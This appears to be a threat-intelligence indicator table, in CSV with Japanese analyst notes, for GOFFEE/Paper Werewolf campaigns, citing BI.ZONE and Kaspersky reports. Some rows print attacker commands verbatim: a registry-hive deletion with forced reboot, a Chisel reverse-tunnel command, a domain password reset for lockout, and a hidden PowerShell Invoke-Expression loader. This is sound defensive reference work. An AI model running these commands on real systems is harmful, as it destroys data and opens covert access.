schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--goffee,artifact--sha256:1c330a69eed8313c45f07e247883c1e7cce21efdbdb62bfffe31083b45814325,observation--sha256:7614e9ca7cdef685eb71381a73c6c734564ee6b6048d41b672c591e8ecbef162,command,cmd.exe /c 'shutdown /r /f /t 5 && reg delete HKEY_LOCAL_MACHINE\SYSTEM /f && reg delete HKEY_LOCAL_MACHINE\SOFTWARE /f',cmd.exe /c 'shutdown /r /f /t 5 && reg delete hkey_local_machine\system /f && reg delete hkey_local_machine\software /f',confirmed,,unknown,unknown,not-stated,2024-12-25T00:00:00Z,source--bizone-paper-werewolf-destructive-2024,https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/,"{""commit"": null, ""path"": ""https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/#campaign"", ""repository"": null, ""row"": null}","[""activity--goffee-paper-werewolf-campaigns-2024""]",[],[],[],1,false,medium,TLP:CLEAR,analyst-primary-source-review,PsExec経由で実行された破壊的コマンド。OSのレジストリハイブを削除したうえで強制再起動する。,BI.ZONEが「a case」と単数で述べる1事例に基づく。諜報目的の達成後の妨害行為である。
1.0.0,actor--goffee,artifact--sha256:d91a11834256baa6af7de52b3275d501a33ab4768e71266bb674f961939b0c6f,observation--sha256:84f270bde174890c52e9160949a266a3af6dd84d98380a516f7ed23a560bb9e6,command,mastc.exe client --tls-skip-verify -v https://<redacted>:49611 R:socks,mastc.exe client --tls-skip-verify -v https://<redacted>:49611 r:socks,confirmed,,unknown,unknown,not-stated,2024-12-25T00:00:00Z,source--bizone-paper-werewolf-destructive-2024,https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/,"{""commit"": null, ""path"": ""https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/#campaign"", ""repository"": null, ""row"": null}","[""activity--goffee-paper-werewolf-campaigns-2024""]",[],[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,Chiselによるリバーストンネルの確立コマンド。,原文は接続先ホストを [redacted] として伏せている。表記を <redacted> へ統一した。
1.0.0,actor--goffee,artifact--sha256:4f09231eaa5b506815ce981a6bae57cb31e8ebf98fc4c7085bea1aa0ef3ed82d,observation--sha256:d0487c251672ce31e8ac98f341d9a007a3e33ce2b01e525946e4cc9c93e0c422,command,net user <redacted> <redacted> /domain,net user <redacted> <redacted> /domain,confirmed,,unknown,unknown,not-stated,2024-12-25T00:00:00Z,source--bizone-paper-werewolf-destructive-2024,https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/,"{""commit"": null, ""path"": ""https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/#campaign"", ""repository"": null, ""row"": null}","[""activity--goffee-paper-werewolf-campaigns-2024""]",[],[],[],1,false,medium,TLP:CLEAR,analyst-primary-source-review,被害組織の職員によるインフラ操作を妨げるためのドメインアカウントのパスワード変更。,原文はアカウント名とパスワードを [redacted] として伏せている。
1.0.0,actor--goffee,artifact--sha256:561dcd228445c51209f073790d524760c783827d7e7107df59f41da3f07894b0,observation--sha256:395e86bc938ca4fb7c8cac83c3c4636f38773f053c7a45e4c85cc7a2c996be8b,command,"powershell.exe -c ""$raw= Get-Content C:\Users\<user>\UserCache.ini;Invoke-Expression $raw""","powershell.exe -c ""$raw= get-content c:\users\<user>\usercache.ini;invoke-expression $raw""",confirmed,2024-07-01T00:00:00Z,month,known,source-stated,2025-04-10T00:00:00Z,source--kaspersky-goffee-recent-attacks-2025,https://securelist.com/goffee-apt-new-attacks/116139/,"{""commit"": null, ""path"": ""https://securelist.com/goffee-apt-new-attacks/116139/#powermodul"", ""repository"": null, ""row"": null}","[""activity--goffee-powermodul-usb-worm-2024""]","[""malware--goffee-powermodul""]",[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,UserCacheHelper.lnk.jsがWin32_Process.Createへ渡すコマンド。ShowWindowを0として非表示で起動する。,原文は利用者名を含む実際のパスを示しているが、被害者を特定し得るため <user> へ置換して収録した。
1.0.0,actor--goffee,artifact--sha256:3cc8738077b02bed4ed94e5685be313f8c2b0b72dc7c82872c828b39cd81f9a0,observation--sha256:2a2cb5e9a5ffec12eb15b64a293b90617cb71acc2c1893bc4154329af6024609,file-name,adbp.exe,adbp.exe,confirmed,2026-03-01T00:00:00Z,month,known,source-stated,2026-08-28T00:00:00Z,source--kaspersky-goffee-warprat-powertaskel-v2-2026,https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/,"{""commit"": null, ""path"": ""https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/#binary-payload"", ""repository"": null, ""row"": null}","[""activity--goffee-warprat-powertaskel-v2-2026""]","[""malware--goffee-warprat""]",[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,ドロッパーが展開して起動するWarpRAT本体。,
1.0.0,actor--goffee,artifact--sha256:d840de678dc9d748b7200f2824ce132e58ebc9a451fa30c06121499d35c698d4,observation--sha256:fb8474f6b44e580ef70873df97d5484d4ba5f54c582fd51e9c67571e82858667,file-name,Adobe_Acrobat_Reader_Plugin_ru.exe,adobe_acrobat_reader_plugin_ru.exe,confirmed,2026-03-01T00:00:00Z,month,known,source-stated,2026-08-28T00:00:00Z,source--kaspersky-goffee-warprat-powertaskel-v2-2026,https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/,"{""commit"": null, ""path"": ""https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/#binary-payload"", ""repository"": null, ""row"": null}","[""activity--goffee-warprat-powertaskel-v2-2026""]","[""malware--goffee-warprat""]",[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,ZIP書庫が含む唯一の実行ファイル。Inno Setup 6.7.0 (Unicode)で作成された悪性ドロッパー。,
1.0.0,actor--goffee,artifact--sha256:da8c3dd27676efbf40c86dad735142db89156b1f877abdfd85f61d92d7905506,observation--sha256:0f21cb021ccc62544443d788dfb659250ee822fa7a3057e70ea2992fa9ae77d6,file-name,Adobe_Reader_RU.zip,adobe_reader_ru.zip,confirmed,2026-03-01T00:00:00Z,month,known,source-stated,2026-08-28T00:00:00Z,source--kaspersky-goffee-warprat-powertaskel-v2-2026,https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/,"{""commit"": null, ""path"": ""https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/#binary-payload"", ""repository"": null, ""row"": null}","[""activity--goffee-warprat-powertaskel-v2-2026""]","[""malware--goffee-warprat""]",[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,偽のAcrobat Reader更新リンクから配布されたZIP書庫の原名。,
1.0.0,actor--goffee,artifact--sha256:ccfff8e7819831e35a624701cc5bf91a26eb3daac7667de5620bc89a9dc77086,observation--sha256:d72991e0b47d14a3ed09ca15261063ee6d6c70ea5ff9f20618736c617d894acb,file-name,ftree.db,ftree.db,confirmed,2024-07-01T00:00:00Z,month,known,source-stated,2025-04-10T00:00:00Z,source--kaspersky-goffee-recent-attacks-2025,https://securelist.com/goffee-apt-new-attacks/116139/,"{""commit"": null, ""path"": ""https://securelist.com/goffee-apt-new-attacks/116139/#flashfilegrabber"", ""repository"": null, ""row"": null}","[""activity--goffee-powermodul-usb-worm-2024""]","[""malware--goffee-flashfilegrabber""]",[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,複写元の絶対パス、サイズ、最終アクセス日時と更新日時を保存するメタデータファイル。,
1.0.0,actor--goffee,artifact--sha256:5a8caa00c75cb6891df8c707bbfaf72cfbabeb149646a74a548667ebf98ab95f,observation--sha256:74f4d37a28f4c2eac591c13cc6bb00ed971b20f880e2d0326a87a9c7196b3264,file-name,install_script.iss,install_script.iss,confirmed,2026-03-01T00:00:00Z,month,known,source-stated,2026-08-28T00:00:00Z,source--kaspersky-goffee-warprat-powertaskel-v2-2026,https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/,"{""commit"": null, ""path"": ""https://securelist.ru/tr/goffee-apt-attacks-with-mythic-agent-and-warprat/116796/#binary-payload"", ""repository"": null, ""row"": null}","[""activity--goffee-warprat-powertaskel-v2-2026""]","[""malware--goffee-warprat""]",[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,Inno Setup用の設置スクリプト。[Run]セクションでadbp.exeを起動した直後におとりPDFをshellexecで開く。,
1.0.0,actor--goffee,artifact--sha256:0750732cd1ff6de78fb8be8137dd7e202cd32b3673c6741f52edcf092bf47961,observation--sha256:7b2184d958856bb8b7a6f0652264f2b724fde5c6dd1f1b55c353610953f1cc8a,file-name,mastc.exe,mastc.exe,confirmed,,unknown,unknown,not-stated,2024-12-25T00:00:00Z,source--bizone-paper-werewolf-destructive-2024,https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/,"{""commit"": null, ""path"": ""https://bi.zone/eng/expertise/blog/paper-werewolf-sovmeshchaet-kibershpionazh-s-destruktivnymi-deystviyami/#campaign"", ""repository"": null, ""row"": null}","[""activity--goffee-paper-werewolf-campaigns-2024""]",[],[],[],1,false,high,TLP:CLEAR,analyst-primary-source-review,Chiselクライアントの実行ファイル名。冗長なアクセス経路の確保に用いられた。,BI.ZONEは観測日を示していない。
